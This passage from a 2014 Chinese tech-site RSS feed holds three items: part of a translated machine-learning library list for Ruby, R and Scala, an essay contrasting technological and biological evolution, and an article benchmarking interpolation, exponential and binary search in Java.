&lt;a href=&quot;https://github.com/louismullie/treat&quot;&gt;Treat&lt;/a&gt;—文本检索与注释工具包，Ruby上我见过的最全面的工具包。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;http://www.deveiate.org/projects/Linguistics/&quot;&gt;Ruby Linguistics&lt;/a&gt;—这个框架可以用任何语言为Ruby对象构建语言学工具。包括一个语言无关的通用前端，一个将语言代码映射到语言名的模块，和一个含有很有英文语言工具的模块。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/aurelian/ruby-stemmer&quot;&gt;Stemmer&lt;/a&gt;—使得Ruby可用 libstemmer_c中的接口。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;http://www.deveiate.org/projects/Ruby-WordNet/&quot;&gt;Ruby Wordnet&lt;/a&gt; —WordNet的Ruby接口库。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;http://sourceforge.net/projects/raspell/&quot;&gt;Raspel&lt;/a&gt; —aspell绑定到Ruby的接口&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/ealdent/uea-stemmer&quot;&gt;UEA Stemmer&lt;/a&gt;—UEALite Stemmer的Ruby移植版，供搜索和检索用的保守的词干分析器&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/twitter/twitter-text-rb&quot;&gt;Twitter-text-rb&lt;/a&gt;—该程序库可以将推特中的用户名、列表和话题标签自动连接并提取出来。&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;
&lt;a href=&quot;https://github.com/josephmisiti/awesome-machine-learning/blob/master/README.md#general-purpose-machine-learning-8&quot; name=&quot;user-content-general-purpose-machine-learning-8&quot;&gt;&lt;/a&gt;通用机器学习&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/tsycho/ruby-machine-learning&quot;&gt;Ruby Machine Learning&lt;/a&gt; —Ruby实现的一些机器学习算法。&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/mizoR/machine-learning-ruby&quot;&gt;Machine Learning Ruby&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/vasinov/jruby_mahout&quot;&gt;jRuby Mahout&lt;/a&gt; —精华！在JRuby世界中释放了Apache Mahout的威力。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/cardmagic/classifier&quot;&gt;CardMagic-Classifier&lt;/a&gt;—可用贝叶斯及其他分类法的通用分类器模块。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/mnielsen/neural-networks-and-deep-learning&quot;&gt;Neural Networks and Deep Learning&lt;/a&gt;—《神经网络和深度学习》一书的示例代码。&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;数据分析/数据可视化&lt;a href=&quot;https://github.com/josephmisiti/awesome-machine-learning/blob/master/README.md#data-analysis--data-visualization-6&quot; name=&quot;user-content-data-analysis--data-visualization-6&quot;&gt;&lt;/a&gt;
&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/alexgutteridge/rsruby&quot;&gt;rsruby&lt;/a&gt; - Ruby – R bridge&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/chrislo/data_visualisation_ruby&quot;&gt;data-visualization-ruby&lt;/a&gt;—关于数据可视化的Ruby Manor演示的源代码和支持内容&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://www.ruby-toolbox.com/projects/ruby-plot&quot;&gt;ruby-plot&lt;/a&gt; —将gnuplot包装为Ruby形式，特别适合将ROC曲线转化为svg文件。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/zuhao/plotrb&quot;&gt;plot-rb&lt;/a&gt;—基于Vega和D3的ruby绘图库&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;http://www.rubyinside.com/scruffy-a-beautiful-graphing-toolkit-for-ruby-194.html&quot;&gt;scruffy&lt;/a&gt; —Ruby下出色的图形工具包&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://sciruby.com/&quot;&gt;SciRuby&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/glean/glean&quot;&gt;Glean&lt;/a&gt;—数据管理工具&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/bioruby/bioruby&quot;&gt;Bioruby&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/nkallen/arel&quot;&gt;Arel&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;
&lt;a href=&quot;https://github.com/josephmisiti/awesome-machine-learning/blob/master/README.md#misc&quot; name=&quot;user-content-misc&quot;&gt;&lt;/a&gt;Misc&lt;br&gt;
杂项&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/infochimps-labs/big_data_for_chimps&quot;&gt;Big Data For Chimps&lt;/a&gt;—大数据处理严肃而有趣的指南书&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;
&lt;a href=&quot;https://github.com/josephmisiti/awesome-machine-learning/blob/master/README.md#r&quot; name=&quot;user-content-r&quot;&gt;&lt;/a&gt;R&lt;/h2&gt;
&lt;h4&gt;
&lt;a href=&quot;https://github.com/josephmisiti/awesome-machine-learning/blob/master/README.md#general-purpose-machine-learning-9&quot; name=&quot;user-content-general-purpose-machine-learning-9&quot;&gt;&lt;/a&gt;通用机器学习&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/jbrownlee/CleverAlgorithmsMachineLearning&quot;&gt;Clever Algorithms For Machine Learning&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/johnmyleswhite/ML_for_Hackers&quot;&gt;Machine Learning For Hackers&lt;br&gt;
&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;http://cran.r-project.org/web/views/MachineLearning.html&quot;&gt;Machine Learning Task View on CRAN&lt;/a&gt;—R语言机器学习包列表，按算法类型分组。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;http://caret.r-forge.r-project.org/&quot;&gt;caret&lt;/a&gt;—R语言150个机器学习算法的统一接口&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/ecpolley/SuperLearner&quot;&gt;SuperLearner&lt;/a&gt; and &lt;a href=&quot;http://cran.r-project.org/web/packages/subsemble/index.html&quot;&gt;subsemble&lt;/a&gt;—该包集合了多种机器学习算法&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www-bcf.usc.edu/~gareth/ISL/&quot;&gt;Introduction to Statistical Learning&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;&lt;a href=&quot;https://github.com/josephmisiti/awesome-machine-learning/blob/master/README.md#data-analysis--data-visualization-7&quot; name=&quot;user-content-data-analysis--data-visualization-7&quot;&gt;&lt;/a&gt;&lt;/h4&gt;
&lt;h4&gt;数据分析/数据可视化&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://health.adelaide.edu.au/psychology/ccs/teaching/lsr/&quot;&gt;Learning Statistics Using R&lt;br&gt;
&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;http://ggplot2.org/&quot;&gt;ggplot2&lt;/a&gt;—基于图形语法的数据可视化包。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;
&lt;a href=&quot;https://github.com/josephmisiti/awesome-machine-learning/blob/master/README.md#scala&quot; name=&quot;user-content-scala&quot;&gt;&lt;/a&gt;Scala&lt;/h2&gt;
&lt;h4&gt;
&lt;a href=&quot;https://github.com/josephmisiti/awesome-machine-learning/blob/master/README.md#natural-language-processing-7&quot; name=&quot;user-content-natural-language-processing-7&quot;&gt;&lt;/a&gt;自然语言处理&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;a href=&quot;http://www.scalanlp.org/&quot;&gt;ScalaNLP&lt;/a&gt;—机器学习和数值计算库的套装&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/scalanlp/breeze&quot;&gt;Breeze&lt;/a&gt; —Scala用的数值处理库&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/scalanlp/chalk&quot;&gt;Chalk&lt;/a&gt;—自然语言处理库。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/factorie/factorie&quot;&gt;FACTORIE&lt;/a&gt;—可部署的概率建模工具包，用Scala实现的软件库。为用户提供简洁的语言来创建关系因素图，评估参数并进行推断。&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;
&lt;a href=&quot;https://github.com/josephmisiti/awesome-machine-learning/blob/master/README.md#data-analysis--data-visualization-8&quot; name=&quot;user-content-data-analysis--data-visualization-8&quot;&gt;&lt;/a&gt;数据分析/数据可视化&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;a href=&quot;http://spark.apache.org/docs/latest/mllib-guide.html&quot;&gt;MLlib in Apache Spark&lt;/a&gt;—Spark下的分布式机器学习库&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/twitter/scalding&quot;&gt;Scalding&lt;/a&gt; —CAscading的Scala接口&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/twitter/summingbird&quot;&gt;Summing Bird&lt;/a&gt;—用Scalding 和 Storm进行Streaming MapReduce&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/twitter/algebird&quot;&gt;Algebird&lt;/a&gt; —Scala的抽象代数工具&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/xerial/xerial&quot;&gt;xerial&lt;/a&gt; —Scala的数据管理工具&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/avibryant/simmer&quot;&gt;simmer&lt;/a&gt; —化简你的数据，进行代数聚合的unix过滤器&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/PredictionIO/PredictionIO&quot;&gt;PredictionIO&lt;/a&gt; —供软件开发者和数据工程师用的机器学习服务器。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/BIDData/BIDMat&quot;&gt;BIDMat&lt;/a&gt;—支持大规模探索性数据分析的CPU和GPU加速矩阵库。&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;
&lt;a href=&quot;https://github.com/josephmisiti/awesome-machine-learning/blob/master/README.md#general-purpose-machine-learning-10&quot; name=&quot;user-content-general-purpose-machine-learning-10&quot;&gt;&lt;/a&gt;通用机器学习&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/etsy/Conjecture&quot;&gt;Conjecture&lt;/a&gt;—Scalding下可扩展的机器学习框架&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/avibryant/brushfire&quot;&gt;brushfire&lt;/a&gt;—scalding下的决策树工具。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/tresata/ganitha&quot;&gt;ganitha&lt;/a&gt; —基于scalding的机器学习程序库&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/bigdatagenomics/adam&quot;&gt;adam&lt;/a&gt;—使用Apache Avro, Apache Spark 和 Parquet的基因组处理引擎，有专用的文件格式，Apache 2软件许可。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/bioscala/bioscala&quot;&gt;bioscala&lt;/a&gt; —Scala语言可用的生物信息学程序库&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://github.com/BIDData/BIDMach&quot;&gt;BIDMach&lt;/a&gt;—机器学习CPU和GPU加速库。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;a href=&quot;https://github.com/josephmisiti/awesome-machine-learning/blob/master/README.md#credits&quot; name=&quot;user-content-credits&quot;&gt;&lt;/a&gt;&lt;/h2&gt;


&lt;!-- div id=&quot;ad1&quot;&gt;
&lt;/div --&gt;

&lt;p&gt;&lt;a target=&quot;_blank&quot; rel=&quot;nofollow&quot; href=&quot;http://www.jobdeer.com/?fr=jobbole&quot;&gt;&lt;/a&gt;&lt;/p&gt;
	


	

</description>
        <pubDate>Mon, 21 Jul 2014 00:00:00 +0800</pubDate>
        <link>http://iftti.com/posts/2014/2014-07-21-73806-f8e20413f.html</link>
        <guid isPermaLink="true">http://iftti.com/posts/2014/2014-07-21-73806-f8e20413f.html</guid>
        
        
      </item>
    
      <item>
        <title>技术的进化</title>
        <description>&lt;p&gt;前几日，吴军博士在微博上转发了王石为其新书《文明之光》写的序言。在序言里，王石提到了达尔文进化论在社会与技术的适应性问题。王石在他短短几句话里并未充分说明了他的观点，只是举了英文键盘的例子说明了&lt;strong&gt;存活下来的不一定更“好”，仅仅是更“适”而已&lt;/strong&gt;。&lt;/p&gt;

&lt;p&gt;我在微博上留下了一条评论：&lt;/p&gt;

&lt;blockquote&gt;&lt;p&gt;生物突变过程，并不一定是适合文明尤其是技术的进化的，好比如从帆船不可能突变到轮船，喷气机也不是内燃机或其它任何先前技术的变种，技术的进化更多是组合进化不太具有偶然性，而不是生物的单物种偶然性突变。&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;用达尔文的理论去解释不同领域的演进,是许多人的偏好，尤其是国人。但是，无论觉得达尔文理论能如何为你切身地解答从哪而来的问题，将它放置于任何领域成为“大一统”的进化观点，我想是不合适的，至少将其置于技术的领域，是不完整的。尽管吴军博士回复说，《文明之光》一书并没有太谈进化论，我还是想把我的观点讲清楚。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;一.不完整的进化论理解&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;达尔文的生物进化理论需要从两个方面来理解：&lt;strong&gt;变异与选择&lt;/strong&gt;。由于某些历史与政治的原因，进化论被引进进入中国时，就被严复梁启超他们“阉割”了，只片面的强调了“选择”一含义，这也就是大多数人固有的“物竞天择，适者生存”的观点，而对其“变异”层面的含义却知之甚少。由于“进化就是选择”这一狭隘观点的影响，导致达尔文的理论被”泛滥“地解释所有的领域的发展，因为单从“选择”层面来看，其确实是适合其它领域的。当然，用来解释社会发展领域的发展，也是当初严复和梁启超他们原本目的。&lt;/p&gt;

&lt;p&gt;如果说“进化就是选择”，那前面王石先生举的英文键盘一例来说进化，也是合理的（其实这也就是常说的”路径依赖“）。但是这样的观点如果奉成为“理论”，肯定是不完整的。选择论回答不了被选择的“物件”从何而来的疑问。而完整的达尔文理论认为&lt;strong&gt;变异为选择提供了资源&lt;/strong&gt;。如果说”选择“解答了发展的问题，那”变异“则解答了起源的问题。在生物的进化上，这里的变异指的就是基因突变，并且是单个物种内的自身基因变化。&lt;/p&gt;

&lt;p&gt;正是这种关乎基因突变的观点，将达尔文理论套到技术领域，是根本站不住脚的。比如雷达诞生于半导体，你可以对20世纪30年代的半导体线圈进行任何你喜欢的改变，但是你永远不可能得到雷达，制造雷达需要一个和半导体完全不同的理念。我前文微博里提到的帆船到轮船，喷气机到内燃机的也同样如此，无论你对帆船如何改造，没有革命性发动机出现，你不可能得到轮船，而发动机的出现，跟”船“这个”物种“不存在任何关系。而从喷气机到内燃机，也不是一脉的向前突变得到的，而是依赖完全不同的物理理论的出现。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;二.技术进化的特点&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;那么技术领域的究竟如何向前进化的呢？技术作家布莱恩.阿瑟在其《技术的本质》一书里给出了一个初步的答案。布莱恩.阿瑟认为技术的进化具有以下两大特点&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;组合进化&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;&lt;strong&gt;技术总是由一些基本的功能模块组合而成的&lt;/strong&gt;。技术的组合进化，是技术演变的最本质特征，也是其不同与生物进化的根本区别。&lt;/p&gt;

&lt;p&gt;在人类发展最初的石器时代，石制工具就被打磨成两类，锋利的和有孔的，这两类又与木制的手柄组合成复合工具，锋利的成了矛，有孔的成了锤头。回到现代，你打开一台老式的台式电脑，你会发现里面的零部件，如CPU，硬盘，内存条等。同时拆开一台现代的智能手机，也会发生同样的部件。同样，蒸汽机的出现，其与原来的帆船技术的组合，从而使得轮船得以出现服务于人类。&lt;strong&gt;技术在某种程度上一定是来自此前已有技术的新的组合&lt;/strong&gt;，这是新技术出现的根本特征，也解答了进化论中关于”变异“那一部分问题。而这个组合进化产生变异的特征在生物体上是看不到的，生物的变异是指单个生物体的基因突变，而不同物种相互组合杂交而进化，几乎没出现过。&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;具有层级递归性模块化演进&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;技术是组合进化的，但是其不是单纯的一层组合，也就是说不是将具有匹配的概念或原理的目的单层次的聚集起来，即可得到新的技术。其组合具有层次结构。可以将技术分解成主集成，次级集成，次次级集成等，直至分解为最基本的部分。如果说整体的技术是树干的话，那次级集成是枝条，最基本的零件就是更小的分支了。以一本纸质书为例，其主集成是纸张和印刷的组合，而纸张和印刷两者可以继续拆分，如印刷可以拆分为油墨技术，电子技术等等。&lt;strong&gt;技术呈现出这种递归性的结构，技术总是包含着技术，直到最基础的水平&lt;/strong&gt;。&lt;/p&gt;

&lt;p&gt;如果只是将技术的单元进行层次化的组合，那将是一个无比复杂的工程。比如一个手表有1000个零件，一个钟表匠一个零件一个零件地安装，安装过程中，如果他的工作被打断了，他就必须从头开始。但是，如果将10个模块组装起来，每个模块又由10个子模块组装起来，每个子模块由10个零件组合起来，当他暂停或被打断工作时，他只是损失了一小部分工作。这种零件集成可以更好地预防不可预知的变动，且更易修复。同时，除了解决复杂性的带来的低效问题，模块化更为重要的一点是允许技术的组成部分分别演进，从而又再推动整体技术的前进。好比如发动机的这一模块的进步，可以推动汽车，轮船这些整体技术的进步一样。&lt;/p&gt;

&lt;p&gt;当然，将技术分割为功能模块是需要付出一些代价的，比如需要耗费时间和精力定义模块之间的标准等。所以，&lt;strong&gt;只有模块能被反复使用，且反复使用的次数足够时，才值得付出代价将技术进行分割&lt;/strong&gt;。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;三.技术进化的启示&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;前面关于技术进化的特点的讨论，不只是让我们认识了技术进化的与生物进化的区别，更是能更好的指导我们构建更有生命力能向前进化的技术产品。回到我们熟悉的软件系统领域，我们见过太多技术产品被很快淘汰，也见过很多技术产品永远处于不断推倒后重构的死胡同里。从进化的角度看，这样的技术产品根本不存在进化的可能。这其中根本原因，我想更多是其没有满足我们前文说到的可进化技术的一些基本特点。一个没有组合特点的系统，其必然扩展性差，必然面临无法向前进一步进化的可能。而没有定义层次和规则，那也就没有模块化的概念，系统无法进行单个模块的垂直演进，没有模块级别的重用， 当碰到任何不可预知的变动，必然是全部推倒重新再来。这样的系统产品，当然也就不存在生命力可言。&lt;/p&gt;

&lt;p&gt;对此审视我们用过的系统产品，那些经久不衰的，如Unix/Linux，必然是遵循这技术进化的根本特征的。而对于当今互联网产品而言，生命力确实是一个奢侈的词，这应该不仅仅是生态环境的选择问题,而需要系统产品生产者更多的反思！&lt;/p&gt;

&lt;hr&gt;

&lt;p&gt;如果您觉得这篇文字有意思，欢迎转发！欢迎更多的朋友们关注我的微信公众号：&lt;strong&gt;JustinNotes&lt;/strong&gt;&lt;/p&gt;

&lt;hr&gt;
</description>
        <pubDate>Sun, 20 Jul 2014 00:00:00 +0800</pubDate>
        <link>http://iftti.com/posts/2014/2014-07-20-ji-zhu-de-jin-hua-9c5e0c611.html</link>
        <guid isPermaLink="true">http://iftti.com/posts/2014/2014-07-20-ji-zhu-de-jin-hua-9c5e0c611.html</guid>
        
        
      </item>
    
      <item>
        <title>击败二分检索算法——插值检索、快速检索</title>
        <description>

					
		
&lt;!-- div id=&quot;ad1&quot;&gt;
&lt;script type=&quot;text/javascript&quot;&gt;
google_ad_client = &quot;ca-pub-7056282119617872&quot;;
google_ad_slot = &quot;6645040531&quot;;
google_ad_width = 300;
google_ad_height = 250;
&lt;/script&gt;
&lt;script type=&quot;text/javascript&quot;
src=&quot;http://pagead2.googlesyndication.com/pagead/show_ads.js&quot;&gt;
&lt;/script&gt;
&lt;/div&gt;
&lt;br/ --&gt;

&lt;p&gt;二分检索是查找有序数组最简单然而最有效的算法之一。现在的问题是，更复杂的算法能不能做的更好？我们先看一下其他方法。&lt;/p&gt;
&lt;p&gt;有些情况下，散列整个数据集是不可行的，或者要求既查找位置，又查找数据本身。这个时候，用哈希表就不能实现O(1)的运行时间了。但对有序数组， 采用分治法通常可以实现O(log(n))的最坏运行时间。&lt;/p&gt;
&lt;p&gt;在下结论前，有一点值得注意，那就是可以从很多方面“击败”一个算法：所需的空间，所需的运行时间，对底层数据结构的访问需求。接下来我们做一个运行时对比实验，实验中创建多个不同的随机数组，其元素个数均在10,000到81,920,000之间，元素均为4字节整型数据。&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;&lt;strong&gt;二分检索&lt;/strong&gt;&lt;/p&gt;
&lt;p align=&quot;center&quot;&gt;&lt;a href=&quot;http://jbcdn2.b0.upaiyun.com/2014/07/28c8edde3d61a0411511d3b1866f06364.png&quot; rel=&quot;lightbox[73517]&quot; title=&quot;击败二分检索算法——插值检索、快速检索&quot;&gt;&lt;img class=&quot;alignnone size-full wp-image-73518&quot; alt=&quot;1&quot; src=&quot;/images/jobbole.com/3926f1cd5450556aeb560d367b40808e.jpg&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p style=&quot;text-align: left;&quot; align=&quot;center&quot;&gt;二分检索算法的每一步，搜索空间总会减半，因此保证了运行时间。在数组中查找一个特定元素，可以保证在 O(log(n))时间内完成，而且如果找的正好是中间元素就更快了。也就是说，要从81,920,000个元素的数组中找某个元素的位置，只需要27个甚至更少的迭代。&lt;/p&gt;
&lt;p&gt;由于二分检索的随机跳跃性，该算法并非缓存友好的，因此只要搜索空间小于特定值（64或者更少），一些微调的二分检索算法就会切换回线性检索继续查找。然而，这个最终的空间值是极其架构相关的，因此大部分框架都没有做这个优化。&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;&lt;strong&gt;快速检索；最后回归到二分检索的快速检索&lt;/strong&gt;&lt;/p&gt;
&lt;p align=&quot;center&quot;&gt;&lt;a href=&quot;http://jbcdn2.b0.upaiyun.com/2014/07/665f644e43731ff9db3d341da5c827e14.png&quot; rel=&quot;lightbox[73517]&quot; title=&quot;击败二分检索算法——插值检索、快速检索&quot;&gt;&lt;img class=&quot;alignnone size-full wp-image-73519&quot; alt=&quot;2&quot; src=&quot;/images/jobbole.com/55b8b2b1d8240367a4a8d1ebb6fec3b1.jpg&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;如果由于某些原因，数组长度未知，快速检索可以识别初始的搜索域。这个算法从第一个元素开始，一直加倍搜索域的上界，直到这个上界已经大于待查关键字。之后，根据实现不同，或者采用标准的二分检索查找，或者开始另一轮的快速检索。前者可以保证O(log(n)) 的运行时间，后者则更接近O(n)的运行时间。&lt;/p&gt;
&lt;p&gt;如果我们要找的元素比较接近数组的开头，快速检索就非常有效。&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;&lt;strong&gt;抽样检索&lt;/strong&gt;&lt;/p&gt;
&lt;p align=&quot;center&quot;&gt;&lt;a href=&quot;http://jbcdn2.b0.upaiyun.com/2014/07/38026ed22fc1a91d92b5d2ef93540f204.png&quot; rel=&quot;lightbox[73517]&quot; title=&quot;击败二分检索算法——插值检索、快速检索&quot;&gt;&lt;img class=&quot;alignnone size-full wp-image-73520&quot; alt=&quot;3&quot; src=&quot;/images/jobbole.com/8fe61d7b867c882f73dcc417d21cf0c2.jpg&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;抽样检索有点类似二分检索，不过在确定主要搜索区域之前，它会先从数组中拿几个样例。最后，如果范围足够小，就采用标准的二分检索确定待查元素的准确位置。这个理论很有趣，不过在实践中执行效果并不好。&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;&lt;strong&gt;插值检索；最后回归到顺序查找的插值检索&lt;/strong&gt;&lt;/p&gt;
&lt;p align=&quot;center&quot;&gt;&lt;a href=&quot;http://jbcdn2.b0.upaiyun.com/2014/07/011ecee7d295c066ae68d4396215c3d03.png&quot; rel=&quot;lightbox[73517]&quot; title=&quot;击败二分检索算法——插值检索、快速检索&quot;&gt;&lt;img class=&quot;alignnone size-full wp-image-73521&quot; alt=&quot;4&quot; src=&quot;/images/jobbole.com/1834e255a86da238292eb405ad63b4e4.jpg&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;在被测的算法中，插值检索可以说是“最聪明”的一个算法。它类似于人类使用电话簿的方法，它试图通过假设元素在数组中均匀分布，来猜测元素的位置。&lt;/p&gt;
&lt;p&gt;首先，它抽样选择出搜索空间的开头和结尾，然后猜测元素的位置。算法一直重复这个步骤，直到找到元素。如果猜测是准确的，比较的次数大概是O(log(log(n))，运行时间大概是O(log(n))；但如果猜测的不对，运行时间就会是O(n)了。&lt;/p&gt;
&lt;p&gt;插值检索的一个改进版本是，只要可推测我们猜测的元素位置是接近最终位置的，就开始执行顺序查找。相比二分检索，插值检索的每次迭代计算代价都很高，因此在最后一步采用顺序查找，无需猜测元素位置的复杂计算，很容易就可以从很小的区域（大概10个元素）中找到最终的元素位置。&lt;/p&gt;
&lt;p&gt;围绕插值检索的一大疑问就是，O(log(log(n))的比较次数可能产生O(log(log(n))的运行时间。这并非个案，因为存储访问时间和计算下一次猜测的CPU时间相比，这两者之间要有所权衡。如果数据量很大，而且存储访问时间也很显著，比如在一个实际的硬盘上，插值检索轻松击败二分检索。然而，实验表明，如果访问时间很短，比如说RAM，插值检索可能不会产生任何好处。&lt;/p&gt;
&lt;p&gt;&lt;b&gt; &lt;/b&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;试验结果&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;试验中的源代码都是用Java写的；每个实验在相同的数组上运行10次；数组是随机产生的整型数组，存储在内存中。&lt;/p&gt;
&lt;p&gt;在插值检索中，首先会采用抽样检索，从检索空间拿20个样例，以确定接下来的搜索域。如果假定的域只有10个或更少的元素，就开始采用线性检索。另外，如果这个搜索域元素个数小于2000，就回退到标准的二分检索了。&lt;/p&gt;
&lt;p&gt;作为参考，java默认的Arrays.binarySearch算法也被加入实验，以同自定义的算法对比运行时间。&lt;/p&gt;
&lt;div align=&quot;center&quot;&gt;
&lt;table border=&quot;1&quot; cellspacing=&quot;0&quot; cellpadding=&quot;0&quot;&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt; &lt;a href=&quot;http://jbcdn2.b0.upaiyun.com/2014/07/e4da3b7fbbce2345d7772b0674a318d5.png&quot; rel=&quot;lightbox[73517]&quot; title=&quot;击败二分检索算法——插值检索、快速检索&quot;&gt;&lt;img class=&quot;alignnone size-medium wp-image-73522&quot; alt=&quot;5&quot; src=&quot;/images/jobbole.com/c302133d6c5ba5d207301064dba6000e.jpg&quot;&gt;&lt;/a&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;p align=&quot;center&quot;&gt;Average search time / element, given the array size&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;
&lt;p&gt; &lt;/p&gt;
&lt;div align=&quot;center&quot;&gt;
&lt;table border=&quot;1&quot; cellspacing=&quot;0&quot; cellpadding=&quot;0&quot;&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt; &lt;a href=&quot;http://jbcdn2.b0.upaiyun.com/2014/07/1679091c5a880faf6fb5e6087eb1b2dc.png&quot; rel=&quot;lightbox[73517]&quot; title=&quot;击败二分检索算法——插值检索、快速检索&quot;&gt;&lt;img class=&quot;alignnone size-medium wp-image-73523&quot; alt=&quot;6&quot; src=&quot;/images/jobbole.com/30896ce76290686b4428b60a44ba2562.jpg&quot;&gt;&lt;/a&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;p align=&quot;center&quot;&gt;Average comparisons / search, given the array size&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;
&lt;p&gt;尽管我们对插值检索期望很高，它的实际运行时间并未击败java默认的二分检索算法。如果存储访问时间长，结合采用某些类型的哈希树和B+树可能是一个更好的选择。但值得注意的是，对均匀分布的数组，组合使用插值检索和顺序检索在比较次数上总能胜过二分检索。不过平台的二分检索已经很高效，所以很多情况下，可能不需要用更复杂的算法来代替它。&lt;/p&gt;
&lt;p&gt;原始数据 – 每个检索的平均运行时间&lt;/p&gt;
&lt;table border=&quot;0&quot; cellpadding=&quot;0&quot;&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;p align=&quot;center&quot;&gt;&lt;b&gt;Size&lt;/b&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p align=&quot;center&quot;&gt;&lt;b&gt;Arrays.&lt;br&gt;
&lt;/b&gt;&lt;b&gt;binarySearch&lt;/b&gt;&lt;b&gt;&lt;/b&gt;&lt;/p&gt;
&lt;/td&gt;
&lt;td&gt;
&lt;p align=&quot;center&quot;&gt;&lt;b&gt;Interpolation&lt;br&gt;
